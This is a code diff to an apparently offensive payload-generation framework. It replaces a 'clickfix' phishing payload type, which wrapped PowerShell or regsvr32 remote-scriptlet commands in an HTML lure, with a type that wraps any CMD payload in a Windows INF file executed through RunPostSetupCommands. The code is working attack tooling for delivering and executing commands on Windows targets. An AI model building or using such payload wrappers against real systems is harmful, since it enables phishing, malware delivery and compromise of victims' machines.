@@ -10,17 +10,17 @@ import shutil
 import base64
 import random
 
-class clickfix(PayloadType):
-    name = "clickfix"
-    file_extension = "html"
+class inf_wraps_cmd(PayloadType):
+    name = "inf_wraps_cmd"
+    file_extension = "inf"
     author = "@hegusung"
     supported_os = [SupportedOS.Windows]
     wrapper = True
-    wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
-    note = """Creates a clickfix payload"""
+    wrapped_payloads = ["cmd_*"]
+    note = """Creates a INF payload which will wraps a CMD payload"""
     translation_container = None # "myPythonTranslation"
-    agent_path = pathlib.Path(".") / "phishingkit"
-    agent_icon_path = agent_path / "agent_functions" / "phishing.svg"
+    agent_path = pathlib.Path(".") / "file"
+    agent_icon_path = agent_path / "agent_functions" / "file.svg"
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
     ]
@@ -36,18 +36,18 @@ class clickfix(PayloadType):
 
         try:
             cmd_payload = self.wrapped_payload.decode()
-            cmd_payload = cmd_payload.replace('"', '\\"')
+         
+            payload = """[version]
+Signature="$Windows NT$"
 
-            f = open(os.path.join(self.agent_code_path, "clickfix.html.template"), 'r')
-            clickfix_template = f.read()
-            f.close()
+[DefaultInstall]
+RunPostSetupCommands=setup
 
-            clickfix_args = {
-                "payload": cmd_payload,
-            }
+[setup]
+{payload}
+"""
 
-
-            resp.payload = clickfix_template.format(**clickfix_args)
+            resp.payload = payload.format(payload=cmd_payload)
             resp.build_message = "Successfully built!\n"
 
         except Exception as e:
